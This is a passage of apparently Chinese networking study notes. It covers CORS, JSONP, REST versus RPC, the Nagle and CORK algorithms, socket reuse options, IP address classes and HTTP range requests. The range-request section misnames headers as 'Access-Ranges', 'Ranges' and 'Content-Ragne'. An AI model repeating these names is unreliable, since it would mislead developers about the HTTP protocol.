<li><p><code>Access-Control-Allow-Headers</code>：如果浏览器请求包括 <code>Access-Control-Request-Headers</code> 字段，则 <code>Access-Control-Allow-Headers</code> 字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。</p>
</li>
<li><p><code>Access-Control-Allow-Credentials</code>：该字段与简单请求时的含义相同。</p>
</li>
<li><p><code>Access-Control-Max-Age</code>：该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p>
</li>
</ul>
<p>一旦服务器通过了”预检”请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个Origin 头信息字段。服务器的回应，也都会有一个 <code>Access-Control-Allow-Origin</code> 头信息字段。</p>
<h4 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h4><p>优点：</p>
<ul>
<li>CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。</li>
<li>支持所有类型的 HTTP 请求。</li>
</ul>
<p>缺点：</p>
<ul>
<li>存在兼容性问题，特别是 IE10 以下的浏览器。</li>
<li>第一次发送非简单请求时会多一次请求。</li>
</ul>
<h3 id="JSONP-跨域"><a href="#JSONP-跨域" class="headerlink" title="JSONP 跨域"></a>JSONP 跨域</h3><p>由于 script 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过动态创建 script 标签，然后利用 src 属性进行跨域，这也就是 JSONP 跨域的基本原理。</p>
<p>优点：</p>
<ul>
<li>使用简便，没有兼容性问题，目前最流行的一种跨域方法。</li>
</ul>
<p>缺点：</p>
<ul>
<li>只支持 GET 请求。</li>
<li>由于是从其它域中加载代码执行，因此如果其他域不安全，很可能会在响应中夹带一些恶意代码。</li>
<li>要确定 JSONP 请求是否失败并不容易。虽然 HTML5 给 script 标签新增了一个 onerror 事件处理程序，但是存在兼容性问题。</li>
</ul>
<h3 id="图像-Ping-跨域"><a href="#图像-Ping-跨域" class="headerlink" title="图像 Ping 跨域"></a>图像 Ping 跨域</h3><p>由于 img 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过 img 标签的 src 属性进行跨域，这也就是图像 Ping 跨域的基本原理。</p>
<p>优点：</p>
<ul>
<li>用于实现跟踪用户点击页面或动态广告曝光次数有较大的优势。</li>
</ul>
<p>缺点：</p>
<ul>
<li>只支持 GET 请求。</li>
<li>只能浏览器与服务器的单向通信，因为浏览器不能访问服务器的响应文本。</li>
</ul>
<h3 id="服务器代理"><a href="#服务器代理" class="headerlink" title="服务器代理"></a>服务器代理</h3><p>浏览器有跨域限制，但是服务器不存在跨域问题，所以可以由服务器请求所有域的资源再返回给客户端。</p>
<h1 id="24-RESTful-架构"><a href="#24-RESTful-架构" class="headerlink" title="24. RESTful 架构"></a>24. RESTful 架构</h1><p>REST，即 Representational State Transfer 的缩写。对这个词组的翻译是”资源表现层状态转化”。</p>
<p>如果一个架构符合REST原则，就称它为RESTful架构。</p>
<p>所谓 <strong>资源</strong>，就是网络上的一个实体，或者说是网络上的一个具体信息。它可以是一段文本、一张图片、一首歌曲、一种服务，总之就是一个具体的实在。可以用一个 URI（统一资源定位符）指向它，每种资源对应一个特定的 URI。要获取这个资源，访问它的 URI 就可以，因此 URI 就成了每一个资源的地址或独一无二的识别符。</p>
<p>所谓”上网”，就是与互联网上一系列的”资源”互动，调用它的URI。</p>
<p>“资源”是一种信息实体，它可以有多种外在表现形式。我们把”资源”具体呈现出来的形式，叫做它的<strong>表现层</strong>（Representation）。</p>
<p>比如，文本可以用 txt 格式表现，也可以用 HTML 格式、XML 格式、JSON 格式表现，甚至可以采用二进制格式；图片可以用 JPG 格式表现，也可以用 PNG 格式表现。</p>
<p>URI 只代表资源的实体，不代表它的形式。严格地说，有些网址最后的 “.html” 后缀名是不必要的，因为这个后缀名表示格式，属于”表现层”范畴，而 URI 应该只代表”资源”的位置。它的具体表现形式，应该在 HTTP 请求的头信息中用 Accept 和 Content-Type 字段指定，这两个字段才是对”表现层”的描述。</p>
<p>访问一个网站，就代表了客户端和服务器的一个互动过程。在这个过程中，势必涉及到数据和状态的变化。</p>
<p>互联网通信协议 HTTP 协议，是一个无状态协议。这意味着，所有的状态都保存在服务器端。因此，如果客户端想要操作服务器，必须通过某种手段，让服务器端发生”状态转化”（State Transfer）。而这种转化是建立在表现层之上的，所以就是<strong>表现层状态转化</strong>。</p>
<p>客户端用到的手段，只能是 HTTP 协议。具体来说，就是 HTTP 协议里面，四个表示操作方式的动词：<code>GET</code>、<code>POST</code>、<code>PUT</code>、<code>DELETE</code>。它们分别对应四种基本操作：<code>GET</code> 用来获取资源，<code>POST</code> 用来新建资源（也可以用于更新资源），<code>PUT</code> 用来更新资源，<code>DELETE</code> 用来删除资源。</p>
<p>综合上面的解释，我们总结一下什么是 RESTful 架构：</p>
<ul>
<li>每一个URI代表一种资源；</li>
<li>客户端和服务器之间，传递这种资源的某种表现层；</li>
<li>客户端通过四个 HTTP 动词，对服务器端资源进行操作，实现”表现层状态转化”。</li>
</ul>
<h1 id="25-RestFul-和-RPC-的区别和应用场景"><a href="#25-RestFul-和-RPC-的区别和应用场景" class="headerlink" title="25. RestFul 和 RPC 的区别和应用场景"></a>25. RestFul 和 RPC 的区别和应用场景</h1><p>RestFul 和 RPC 都是网络交互的协议规范。通常用于多个微服务之间的通信协议。</p>
<p><img src="http://qiniu.xiaoming.net.cn/RestFul%E5%92%8CRPC%E6%AF%94%E8%BE%83.jpeg" alt="RestFul 和 RPC 比较"></p>
<p>高与低是对实现两种规范框架的相对比较，但也不是绝对的，需要根据实际情况而定。</p>
<h2 id="REST与RPC应用场景"><a href="#REST与RPC应用场景" class="headerlink" title="REST与RPC应用场景"></a>REST与RPC应用场景</h2><p>REST 和 RPC 都常用于微服务架构中。</p>
<ol>
<li>HTTP相对更规范，更标准，更通用，无论哪种语言都支持http协议。如果是对外开放API，例如开放平台，外部的编程语言多种多样，你无法拒绝对每种语言的支持，现在开源中间件，基本最先支持的几个协议都包含RESTful。</li>
<li>RPC 框架作为架构微服务化的基础组件，它能大大降低架构微服务化的成本，提高调用方与服务提供方的研发效率，屏蔽跨进程调用函数（服务）的各类复杂细节。让调用方感觉就像调用本地函数一样调用远端函数、让服务提供方感觉就像实现一个本地函数一样来实现服务。</li>
</ol>
<p>所以，如果是后端两种语言互相调用，用 RPC 可以获得更好的性能（省去了 HTTP 报头等一系列东西），应该也更容易配置，如果是前端通过 AJAX 调用后端，那么用 REST API 的形式比较好。</p>
<h1 id="26-TCP中的Nagle算法"><a href="#26-TCP中的Nagle算法" class="headerlink" title="26. TCP中的Nagle算法"></a>26. TCP中的Nagle算法</h1><p>在使用一些协议通讯的时候，会有一个字节一个字节的发送的情景，每次发送一个字节的有用数据，就会产生 41 个字节长的分组，20 个字节的 IP Header 和 20 个字节的 TCP Header，这就导致了 1 个字节的有用信息要浪费掉 40 个字节的头部信息，这是一笔巨大的字节开销，而且这种小包在广域网上会增加拥塞的出现。</p>
<p>TCP 总是希望尽可能的发送足够大的数据。(在一个连接中会设置 <code>MSS</code> 参数,因此,TCP/IP 希望每次都能够以 <code>MSS</code> 尺寸的数据块来发送数据)。Nagle 算法就是为了尽可能发送大块数据,避免网络中充斥着许多小数据块。</p>
<p>Nagle 算法的基本定义是任意时刻,最多只能有一个未被确认的小段。所谓“小段”,指的是小于 <code>MSS</code> 尺寸的数据块,所谓“未被确认”,是指一个数据块发送出去后,没有收到对方发送的 ACK 确认该数据已收到.</p>
<p>Nagle算法的规则(可参考 tcp_output.c 文件里 tcp_nagle_check 函数注释)：</p>
<ol>
<li>如果包长度达到 MSS,则允许发送；</li>
<li>如果该包含有 FIN,则允许发送；</li>
<li>设置了 TCP_NODELAY 选项,则允许发送；</li>
<li>未设置 TCP_CORK 选项（使用CORK算法）时,若所有发出去的小数据包(包长度小于MSS)均被确认，则允许发送；</li>
<li>上述条件都未满足,但发生了超时(一般为200ms),则立即发送.</li>
</ol>
<p>Nagle 算法只允许一个未被确认的包存在于网络,它并不管包的大小,因此它事实上就是一个扩展的停——等协议,只不过它是基于包的停——等的,而不是基于字节停——等的。Nagle 算法完全由 TCP 协议的 ACK 机制决定,这会带来一些问题,比如如果对端 ACK 回复很快的话,Nagle 事实上不会拼接太多的数据包,虽然避免了网络拥塞,网络总体的利用率依然很低。</p>
<p>默认情况下,发送数据采用 Negale 算法。这样虽然提高了网络吞吐量,但是实时性却降低了,在一些交互性很强的应用程序来说是不允许的,使用 <code>TCP_NODELAY</code> 选项可以禁止 Negale 算法。此时，应用程序向内核递交的每个数据包都会立即发送出去。需要注意的是，虽然禁止了 Negale 算法，但网络的传输仍然受到 TCP 确认延迟机制的影响。</p>
<h2 id="CORK-算法"><a href="#CORK-算法" class="headerlink" title="CORK 算法"></a>CORK 算法</h2><p>所谓的 CORK 就是塞子的意思，形象地理解就是用 CORK 将连接塞住,使得数据先不发出去,等到拔去塞子后再发出去。设置该选项后,内核会尽力把小数据包拼接成一个大的数据包(一个 MTU )再发送出去，当然若一定时间后(一般为 200 ms,该值尚待确认)，内核仍然没有组合成一个 MTU 时也必须发送现有的数据(不可能让数据一直等待)。</p>
<p>但是，<code>TCP_CORK</code> 的实现可能并不那么完美，CORK 并不会将连接完全塞住。内核其实并不知道应用层到底什么时候会发送第二批数据用于和第一批数据拼接以达到 MTU 的大小，因此内核会给出一个时间限制，在该时间内没有拼接成一个大包(努力接近 MTU )的话,内核就会无条件发送。也就是说若应用层程序发送小包数据的间隔不够短时，TCP_CORK 就没有一点作用，反而失去了数据的实时性(每个小包数据都会延时一定时间再发送)。</p>
<p><strong>Nagle 算法主要避免网络因为太多的小包(协议头的比例非常之大)而拥塞,而 CORK 算法则是为了提高网络的利用率</strong></p>
<h1 id="27-Socket"><a href="#27-Socket" class="headerlink" title="27. Socket"></a>27. Socket</h1><p>TCP/UDP是由以下五元组唯一地识别的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&lt;protocol&gt;, &lt;src addr&gt;, &lt;src port&gt;, &lt;dest addr&gt;, &lt;dest port&gt;&#125;</span><br></pre></td></tr></table></figure>

<p>这些数值组成的任何独特的组合可以唯一地确认一个连接。对于任意连接，这五个值都不能完全相同。否则的话操作系统就无法区别这些连接了。</p>
<p>套接字是一种通信机制，凭借这种机制，客户/服务器（即要进行通信的进程）系统的开发工作既可以在本地单机上进行，也可以跨网络进行。也就是说它可以让不在同一台计算机但通过网络连接计算机上的进程进行通信。</p>
<p>Socket 是应用层和传输层之间的桥梁</p>
<p>套接字是支持 TCP/IP 的网络通信的基本操作单元，可以看做是不同主机之间的进程进行双向通信的端点，简单的说就是通信的两方的一种约定，用套接字中的相关函数来完成通信过程。</p>
<h2 id="套接字特性"><a href="#套接字特性" class="headerlink" title="套接字特性"></a>套接字特性</h2><p>套接字的特性由3个属性确定，它们分别是：域、端口号、协议类型。</p>
<h3 id="套接字的域"><a href="#套接字的域" class="headerlink" title="套接字的域"></a>套接字的域</h3><p>它指定套接字通信中使用的网络介质，最常见的套接字域有两种：</p>
<p>一是 AF_INET，它指的是 Internet 网络。当客户使用套接字进行跨网络的连接时，它就需要用到服务器计算机的 IP 地址和端口来指定一台联网机器上的某个特定服务，所以在使用 socket 作为通信的终点，服务器应用程序必须在开始通信之前绑定一个端口，服务器在指定的端口等待客户的连接。</p>
<p>另一个域 AF_UNIX，表示 UNIX 文件系统，它就是文件输入/输出，而它的地址就是文件名。</p>
<h3 id="套接字的端口号"><a href="#套接字的端口号" class="headerlink" title="套接字的端口号"></a>套接字的端口号</h3><p>每一个基于 TCP/IP 网络通讯的程序(进程)都被赋予了唯一的端口和端口号，端口是一个信息缓冲区，用于保留 Socket 中的输入/输出信息，端口号是一个 16 位无符号整数，范围是 0-65535，以区别主机上的每一个程序（端口号就像房屋中的房间号），低于 256 的端口号保留给标准应用程序，比如 pop3 的端口号就是110，每一个套接字都组合进了IP地址、端口，这样形成的整体就可以区别每一个套接字。</p>
<h3 id="套接字协议类型"><a href="#套接字协议类型" class="headerlink" title="套接字协议类型"></a>套接字协议类型</h3><p>因特网提供三种通信机制:</p>
<p>一是流套接字，流套接字在域中通过 TCP/IP 连接实现，同时也是 AF_UNIX 中常用的套接字类型。流套接字提供的是一个有序、可靠、双向字节流的连接，因此发送的数据可以确保不会丢失、重复或乱序到达，而且它还有一定的出错后重新发送的机制。</p>
<p>二个是数据报套接字，它不需要建立连接和维持一个连接，它们在域中通常是通过 UDP/IP 协议实现的。它对可以发送的数据的长度有限制，数据报作为一个单独的网络消息被传输,它可能会丢失、复制或错乱到达，UDP 不是一个可靠的协议，但是它的速度比较高，因为它并不需要总是建立和维持一个连接。</p>
<p>三是原始套接字，原始套接字允许对较低层次的协议直接访问，比如 IP、 ICMP 协议，它常用于检验新的协议实现，或者访问现有服务中配置的新设备，因为 RAW SOCKET 可以自如地控制 Windows 下的多种协议，能够对网络底层的传输机制进行控制，所以可以应用原始套接字来操纵网络层和传输层应用。比如，我们可以通过 RAW SOCKET 来接收发向本机的 ICMP、IGMP 协议包，或者接收 TCP/IP 栈不能够处理的 IP 包，也可以用来发送一些自定包头或自定协议的 IP 包。网络监听技术很大程度上依赖于 SOCKET_RAW。</p>
<p>原始套接字与标准套接字的区别在于：</p>
<p>原始套接字可以读写内核没有处理的 IP 数据包，而流套接字只能读取 TCP 协议的数据，数据报套接字只能读取 UDP 协议的数据。因此，如果要访问其他协议发送数据必须使用原始套接字。</p>
<h2 id="套接字通信的建立"><a href="#套接字通信的建立" class="headerlink" title="套接字通信的建立"></a>套接字通信的建立</h2><p><img src="http://qiniu.xiaoming.net.cn/Socket%E9%80%9A%E4%BF%A1%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B.webp" alt="Socket通信基本流程"></p>
<h3 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h3><ol>
<li>首先服务器应用程序用系统调用socket来创建一个套接字，它是系统分配给该服务器进程的类似文件描述符的资源，它不能与其他的进程共享。</li>
<li>然后，服务器进程会给套接字起个名字，我们使用系统调用bind来给套接字命名。然后服务器进程就开始等待客户连接到这个套接字。</li>
<li>接下来，系统调用listen来创建一个队列并将其用于存放来自客户的进入连接。</li>
<li>最后，服务器通过系统调用accept来接受客户的连接。它会创建一个与原有的命名套接不同的新套接字，这个套接字只用于与这个特定客户端进行通信，而命名套接字（即原先的套接字）则被保留下来继续处理来自其他客户的连接（建立客户端和服务端的用于通信的流，进行通信）。</li>
</ol>
<h3 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h3><ol>
<li>客户应用程序首先调用socket来创建一个未命名的套接字，然后将服务器的命名套接字作为一个地址来调用connect与服务器建立连接。</li>
<li>一旦连接建立，我们就可以像使用底层的文件描述符那样用套接字来实现双向数据的通信（通过流进行数据传输）。</li>
</ol>
<h2 id="使用规则"><a href="#使用规则" class="headerlink" title="使用规则"></a>使用规则</h2><p>一个 socket 的协议是在用 <code>socket()</code> 初始化的时候就设置好的。源地址（source address）和源端口（source port）在调用 <code>bind()</code> 的时候设置。目的地址（destination address）和目的端口（destination port）在调用 <code>connect()</code> 的时候设置。其中 UDP 是无连接的，UDP socket 可以在未与目的端口连接的情况下使用。但 UDP 也可以在某些情况下先与目的地址和端口建立连接后使用。在使用无连接 UDP 发送数据的情况下，如果没有显式地调用 <code>bind()</code>，操作系统会在第一次发送数据时自动将 UDP socket 与本机的地址和某个端口绑定（否则的话程序无法接受任何远程主机回复的数据）。同样的，一个没有绑定地址的 TCP socket 也会在建立连接时被自动绑定一个本机地址和端口。</p>
<p>如果手动绑定一个端口，可以将 socket 绑定至端口0，<strong>绑定至端口 0 的意思是让系统自己决定使用哪个端口</strong>（一般是从一组操作系统特定的提前决定的端口数范围中），所以也就是任何端口的意思。</p>
<p>同样的，也可以使用一个通配符来让系统决定绑定哪个源地址（ipv4通配符为 <code>0.0.0.0</code>，ipv6通配符为 <code>::</code>）。</p>
<p>与端口不同的是，一个 socket 可以被绑定到主机上所有接口所对应的地址中的任意一个。基于连接在本 socket 的目的地址和路由表中对应的信息，操作系统将会选择合适的地址来绑定这个 socket，并用这个地址来取代之前的通配符 IP 地址。</p>
<p>在默认情况下，<strong>任意两个 socket 不能被绑定在同一个源地址和源端口组合上</strong>。需要注意的是，如果某一个 socket 被绑定在通配符IP地址下，那么事实上本机所有 IP 都会被系统认为与其绑定了。例如一个socket绑定了 <code>0.0.0.0:21</code>，在这种情况下，任何其他 socket 不论选择哪一个具体的 IP 地址，其都不能再绑定在 21 端口下。因为通配符IP0.0.0.0与所有本地 IP 都冲突。</p>
<h2 id="SO-REUSEADDR-的作用"><a href="#SO-REUSEADDR-的作用" class="headerlink" title="SO_REUSEADDR 的作用"></a>SO_REUSEADDR 的作用</h2><h3 id="作用一：改变系统对待通配符IP地址冲突的方式"><a href="#作用一：改变系统对待通配符IP地址冲突的方式" class="headerlink" title="作用一：改变系统对待通配符IP地址冲突的方式"></a>作用一：改变系统对待通配符IP地址冲突的方式</h3><p>如果在一个 socket 绑定到某一地址和端口之前设置了其 <code>SO_REUSEADDR</code> 的属性，那么除非本 socket 与产生了尝试与另一个 socket 绑定到<strong>完全相同</strong>的源地址和源端口组合的冲突，否则的话这个 socket 就可以成功的绑定这个地址端口对。<code>SO_REUSEADDR</code> 主要改变了系统对待通配符IP地址冲突的方式。</p>
<p>如果不用 <code>SO_REUSEADDR</code> 的话，如果将 socketA 绑定到 <code>0.0.0.0:21</code>，那么任何将本机其他socket 绑定到端口 21 的举动都会导致 <code>EADDRINUSE</code> 错误。因为 <code>0.0.0.0</code> 是一个通配符IP地址，意味着任意一个 IP 地址，所以任何其他本机上的 IP 地址都被系统认为已被占用。如果设置了 <code>SO_REUSEADDR</code> 选项，因为 <code>0.0.0.0:21</code> 和 <code>192.168.1.1:21</code> 并不是完全相同的地址端口对（其中一个是通配符 IP 地址，另一个是一个本机的具体IP地址），所以这样的绑定是可以成功的。需要注意的是，无论 socketA 和 socketB 初始化的顺序如何，只要设置了 <code>SO_REUSEADDR</code>，绑定都会成功；而只要没有设置 <code>SO_REUSEADDR</code>，绑定都不会成功。</p>
<h3 id="作用二：使处于-TIME-WAIT-状态的-socket-能够被连接"><a href="#作用二：使处于-TIME-WAIT-状态的-socket-能够被连接" class="headerlink" title="作用二：使处于 TIME_WAIT 状态的 socket 能够被连接"></a>作用二：使处于 TIME_WAIT 状态的 socket 能够被连接</h3><p>如果 <code>SO_REUSEADDR</code> 选项没有被设置，处于 <code>TIME_WAIT</code> 阶段的 socket 仍然被认为是绑定在原来那个地址和端口上的。直到该 socket 被完全关闭之前（结束 TIME_WAIT 阶段），<strong>任何其他企图将一个新socket 绑定该该地址端口对的操作都无法成功</strong>。这一等待的过程可能和延迟等待的时间一样长。所以不能马上将一个新的 socket 绑定到一个刚刚被关闭的 socket 对应的地址端口对上。在大多数情况下这种操作都会失败。</p>
<p>然而，如果在新的 socket 上设置了 <code>SO_REUSEADDR</code> 选项，如果此时有另一个 socket 绑定在当前的地址端口对且处于 TIME_WAIT 阶段，那么这个已存在的绑定关系将会被忽略。事实上处于 TIME_WAIT 阶段的 socket 已经是半关闭的状态，将一个新的 socket 绑定在这个地址端口对上不会有任何问题。这样的话原来绑定在这个端口上的 socket 一般不会对新的 socket 产生影响。</p>
<h2 id="SO-REUSEPORT-的作用"><a href="#SO-REUSEPORT-的作用" class="headerlink" title="SO_REUSEPORT 的作用"></a>SO_REUSEPORT 的作用</h2><p>基本上来说，<code>SO_REUSEPORT</code> 允许<strong>将任意数目的 socket 绑定到完全相同的源地址端口对上</strong>，只要所有之前绑定的 socket 都设置了 <code>SO_REUSEPORT</code> 选项。如果第一个绑定在该地址端口对上的 socket 没有设置 <code>SO_REUSEPORT</code>，无论之后的 socket 是否设置 <code>SO_REUSEPORT</code>，其都无法绑定在与这个地址端口完全相同的地址上。除非第一个绑定在这个地址端口对上的 socket 释放了这个绑定关系。</p>
<p>与 <code>SO_REUSEADDR</code> 不同的是 ，处理 <code>SO_REUSEPORT</code> 的代码不仅会检查当前尝试绑定的 socket 的 <code>SO_REUSEPORT</code>，而且也会检查之前已绑定了当前尝试绑定的地址端口对的 socket 的 <code>SO_REUSEPORT</code> 选项。</p>
<h1 id="28-TCP和UDP可以同时监听相同的端口吗"><a href="#28-TCP和UDP可以同时监听相同的端口吗" class="headerlink" title="28. TCP和UDP可以同时监听相同的端口吗"></a>28. TCP和UDP可以同时监听相同的端口吗</h1><p>可以。</p>
<p>端口可以形象地比喻成操作系统上的编号唯一的文件，应用程序和网络协议可以对其进行 i/o 操作。</p>
<p>但是既然唯一又为何 tcp/udp 可以用相同的端口号呢？这样的话，程序在连接到端口时，怎么知道此时从该端口进来的数据是tcp的还是udp的呢？</p>
<p>原因是 IP 数据包首部有个叫做协议的字段，指出了上层协议是 TCP 还是 UDP 还是其他P。</p>
<p>协议字段，其值为6，则为TCP；其值为17，则为UDP。</p>
<p>操作系统有能力根据接受的报文的 IP 字段里面的协议部分判断这个报文是什么报文，就是说，系统读数据的时候还没有读到上层报文（TCP/UDP）的时候已经知道上层是什么报文了，直接交给相关的内核进程或协议栈处理就可以了，而在同一个协议内部端口号唯一。</p>
<h1 id="29-Controller-层如何获取到请求的信息"><a href="#29-Controller-层如何获取到请求的信息" class="headerlink" title="29. Controller 层如何获取到请求的信息"></a>29. Controller 层如何获取到请求的信息</h1><p>客户端发起的请求，都是 http 请求，controller 层对请求数据的解析是按照 json 还是 xml 的依据就是请求头 <code>content-type</code>。</p>
<p>请求报文中包含有请求方法以及对应的 URL，发送到 controller 之后，controller 对请求报文的正文进行解析。</p>
<h1 id="30-IP地址"><a href="#30-IP地址" class="headerlink" title="30. IP地址"></a>30. IP地址</h1><p>IP 地址就是给互联网上的每一台主机（或路由器）的每一个接口分配在一个全世界范围内是唯一的32位的标识符。IP 地址可以划分为若干类，每一类地址都由两个固定长度的字段组成，其中第一个字段是<strong>网络号</strong>，它标志主机（或路由器）所连接到的网络。一个网络号在整个互联网范围内必须是唯一的。第二个字段是<strong>主机号</strong>，它标志该主机（或路由器）。</p>
<p>下图是各种 IP 地址的网络号字段和主机号字段，这里 A 类、B 类和 C 类地址都是单播地址（一对一通信），是最常用的。</p>
<p><img src="https://qiniu.xiaoming.net.cn/IP%E5%9C%B0%E5%9D%80%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8F%B7%E5%AD%97%E6%AE%B5%E5%92%8C%E4%B8%BB%E6%9C%BA%E5%8F%B7%E5%AD%97%E6%AE%B5.jpg" alt="IP地址中的网络号字段和主机号字段"></p>
<p>IP地址，一共分成了5类，范围分别如下：</p>
<ul>
<li><p>A类IP：从 1.0.0.0 – 126.255.255.255，共有 16777214 个IP</p>
<blockquote>
<p>A 类地址可以指派的网络号是126个（2的7次方-2），减2的原因在于：第一，IP 地址中的全 0 表示“这个”。网络号字段全为 0 的 IP 地址是个保留地址，意思是“本网络”；第二，网络号为127（即01111111）保留作为本地软件环回测试本主机的进程之间通信之用。</p>
<p>A 类网络中的最大主机数是16777214个（2的24次方-2），减2的原因在于：全 0 的主机号字段表示该 IP 地址是“本主机”所连接到的单个网络地址（例如，一个主机的 IP 地址是 5.6.7.8，则该主机所在的网络地址就是 5.0.0.0），而全 1 表示 “所有的（all）”，因此全 1 的主机号字段表示该网络上的所有主机。</p>
</blockquote>
</li>
<li><p>B类IP：从 128.1.0.0 – 191.255.255.255，共有65534个IP</p>
<blockquote>
<p>B 类地址的网络号的前 2 位已经固定（1 0），只对剩下的 14 位进行分配。因为网络号字段后面的 14 位无论怎么样取值也不可能出现使整个 2 字节的网络号字段成为全 0 或 全 1，因此这里不存在网络总数减 2 的问题。但实际上，B 类网络地址的 128.0.0.0 是不指派的，而可以指派的 B 类最小网络地址是 128.1.0.0</p>
</blockquote>
</li>
<li><p>C类IP：从 192.0.1.0 – 223.255.255.255，共有256个IP</p>
<blockquote>
<p>C 类网络地址 192.0.0.0 也是不指派的，可以指派的 C 类最小网络地址是 192.0.1.0</p>
</blockquote>
</li>
</ul>
<p>而其中，能在 Internet 或被用户使用的 A、B、C三类，而 D 类用作组播地址，E 类作为科研保留地址段</p>
<p><img src="https://qiniu.xiaoming.net.cn/IP%E5%9C%B0%E5%9D%80%E7%9A%84%E6%8C%87%E6%B4%BE%E8%8C%83%E5%9B%B4.jpg" alt="IP 地址的指派范围"></p>
<h2 id="公有IP和私有IP"><a href="#公有IP和私有IP" class="headerlink" title="公有IP和私有IP"></a>公有IP和私有IP</h2><p>公有地址（Public address，也可称为公网地址）由Internet NIC（Internet Network Information Center因特网信息中心）负责。这些 IP 地址分配给注册并向 Internet NIC 提出申请的组织机构。通过它直接访问因特网，它是广域网范畴内的。</p>
<p>私有地址（Private address，也可称为专网地址）属于非注册地址，专门为组织机构内部使用，它是局域网范畴内的，私有 IP 禁止出现在 Internet 中，在 ISP 连接用户的地方，将来自于私有 IP 的流量全部都会阻止并丢掉。</p>
<h2 id="公有IP地址的范围："><a href="#公有IP地址的范围：" class="headerlink" title="公有IP地址的范围："></a>公有IP地址的范围：</h2><h3 id="A类的公有IP："><a href="#A类的公有IP：" class="headerlink" title="A类的公有IP："></a>A类的公有IP：</h3><ul>
<li>1.0.0.0~9.255.255.255</li>
<li>11.0.0.0~126.255.255.255</li>
</ul>
<h3 id="B类的公有IP："><a href="#B类的公有IP：" class="headerlink" title="B类的公有IP："></a>B类的公有IP：</h3><ul>
<li>128.0.0.0~172.15.255.255</li>
<li>172.32.0.0~191.255.255.255</li>
</ul>
<h3 id="C类的公有IP："><a href="#C类的公有IP：" class="headerlink" title="C类的公有IP："></a>C类的公有IP：</h3><ul>
<li>192.0.0.0~192.167.255.255</li>
<li>192.169.0.0~223.255.255.255</li>
</ul>
<h2 id="私有IP地址的范围："><a href="#私有IP地址的范围：" class="headerlink" title="私有IP地址的范围："></a>私有IP地址的范围：</h2><h3 id="A类私有IP地址："><a href="#A类私有IP地址：" class="headerlink" title="A类私有IP地址："></a>A类私有IP地址：</h3><ul>
<li>10.0.0.0～10.255.255.255</li>
</ul>
<h3 id="B类私有IP地址："><a href="#B类私有IP地址：" class="headerlink" title="B类私有IP地址："></a>B类私有IP地址：</h3><ul>
<li>172.16.0.0～172.31.255.255</li>
</ul>
<h3 id="C类私有IP地址："><a href="#C类私有IP地址：" class="headerlink" title="C类私有IP地址："></a>C类私有IP地址：</h3><ul>
<li>192.168.0.0～192.168.255.255</li>
</ul>
<h1 id="31-IP-数据报"><a href="#31-IP-数据报" class="headerlink" title="31. IP 数据报"></a>31. IP 数据报</h1><p>IP 数据报的格式如下：</p>
<p>![IP 数据报格式](<a href="https://qiniu.xiaoming.net.cn/IP">https://qiniu.xiaoming.net.cn/IP</a> 数据报格式.jpg)</p>
<p>①版本：占 4 位，指 IP 协议的版本，目前广泛使用 IPv4；</p>
<p>②首部长度：占 4 位，以 32 位为单位，常用长度为 20 字节，最大为 60 字节；</p>
<p>③区分服务：占 8 位，用来获得更好的服务，一般不使用；</p>
<p>④总长度：占 16 位，指首部和数据之和的长度，单位为字节；</p>
<p>⑤标识：占 16 位，是一个计数器，每产生一个数据报，计数器就加 1，并将此值赋给标识字段；</p>
<p>⑥标志：占 3 位，最低位 MF＝1 表示后面还有分片，MF＝0 表示最后一个分片；标志字段中间的一位 DF＝0 表示允许分片，否则不允许；</p>
<p>⑦片偏移：占 13 位，片偏移指出某片在原分组中的相对位置，以 8 个字节为偏移单位；</p>
<p>⑧生存时间 TTL：占 8 位，表明数据报在网络中可通过的路由器的最大值，标识分组在网络中的寿命；</p>
<p>⑨协议：占 8 位，指出数据报携带的数据使用何种协议；</p>
<p>⑩首部检验和：占 16 位，只检验数据报的首部，不包括数据部分；</p>
<p>⑪源地址：占 32 位，标识发送方的 IP 地址；</p>
<p>⑫目的地址：占 32 位，标识接收方的 IP 地址。</p>
<h1 id="32-如何进行断点续传"><a href="#32-如何进行断点续传" class="headerlink" title="32. 如何进行断点续传"></a>32. 如何进行断点续传</h1><p>在 HTTP/1.1 中，很明确的声明了一个响应头部 <code>Access-Ranges</code> 来标记是否支持范围请求，它只有一个可选参数 <code>bytes</code>。</p>
<p>如果已经确定双端都支持范围请求，我们就可以在请求资源的时候使用它。所有的文件最终都是存储在磁盘或者内存中的字节，对于待操作的文件可以将其以字节为单位分割。这样只需要 HTTP 支持请求该文件从 n 到 n+x 这个范围内的资源，就可以实现范围请求了。</p>
<p>HTTP/1.1 中定义了一个 <code>Ranges</code> 的请求头，来指定请求实体的范围。它的范围取值是在 <code>0 - Content-Length</code> 之间，使用 <code>-</code> 分割。</p>
<p>例如已经下载了 1000 bytes 的资源内容，想接着继续下载之后的资源内容，只要在 HTTP 请求头部，增加 <code>Ranges:bytes=1000-</code> 就可以了。</p>
<p><code>Range</code> 还有几种不同的方式来限定范围，可以根据需要灵活定制：</p>
<ol>
<li>500-1000：指定开始和结束的范围，一般用于多线程下载。</li>
<li>500- ：指定开始区间，一直传递到结束。这个就比较适用于断点续传、或者在线播放等等。</li>
<li>-500：无开始区间,意思是只需要最后 500 bytes 的内容实体。</li>
<li>100-300,1000-3000：指定多个范围，这种方式使用的场景很少，了解一下就好了。</li>
</ol>
<p>HTTP 协议是一种双边协商的协议，既然请求头部已经确定是使用 <code>Ranges</code> 了，还有响应头部中，也需要使用 <code>Content-Ragne</code> 这个响应头来标记响应的实体内容范围。</p>
<p><code>Content-Range</code> 的格式也很清晰，首先标记它的单位是 <code>bytes</code> 然后标记当前传递的内容实体范围和总长度。</p>
